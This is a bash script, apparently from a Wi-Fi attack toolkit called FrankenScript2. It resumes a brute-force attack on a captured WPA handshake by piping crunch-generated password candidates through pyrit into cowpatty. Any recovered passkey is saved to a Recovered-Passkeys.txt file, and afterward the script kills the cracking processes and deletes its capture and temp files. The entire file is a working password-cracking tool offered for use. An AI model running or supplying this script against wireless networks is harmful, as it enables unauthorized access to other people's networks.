#!/bin/bash

EndedOn2=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/EndedOn2.txt | awk '{ print $1 }')
Capture_File=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""1"p")
AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""2"p")
MinPasskeyLength=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""3"p")
MaxPasskeyLength=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""4"p")
CharacterSet=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""5"p")
CharacterLimit=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""6"p")

echo "Resume Details"
echo "$EndedOn2"
echo "$Capture_File"
echo "$AP_essid"
echo "$MinPasskeyLength"
echo "$MaxPasskeyLength"
echo "$CharacterSet"
echo "$CharacterLimit"
echo "crunch $MinPasskeyLength $MaxPasskeyLength $CharacterSet -s $EndedOn2 -d $CharacterLimit -i"
echo ""

crunch $MinPasskeyLength $MaxPasskeyLength $CharacterSet -s $EndedOn2 -d $CharacterLimit -i | pyrit -e $AP_essid -i - -o - passthrough | cowpatty -d - -r $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$Capture_File -s $AP_essid | tee -i $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt

Passkey_Check2=$(grep "The PSK is" $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt)
if [[ $Passkey_Check2 ]]; then
   clear
   echo "$Passkey_Check2"
   echo $Passkey_Check2 > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$AP_essid"_Recovered_Handshake_Passkey".txt
   echo 'AP ESSID: '$AP_essid'' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$AP_essid"_Recovered_Handshake_Passkey".txt | sed -e 's/"//g' -e 's/[.]//g' -e 's/is/is:/g' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

   if [ "$(pidof crunch)" ] 
   then
      killall crunch
   fi

   if [ "$(pidof pyrit)" ] 
   then
      killall pyrit
   fi

   if [ "$(pidof cowpatty)" ] 
   then
      killall cowpatty
   fi

   if [ "$(pidof tee)" ] 
   then
      killall tee
   fi

   read -p $GREEN"Press $RED[Enter]$GREEN to finish and close this xterm window."$STAND

   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt

   killall Handshake_2.sh
else
   echo "Password not found, the xterm window will close in 5 seconds..."
   sleep 5
fi

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt | tac | head -1 > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/EndedOn2.txt

exit
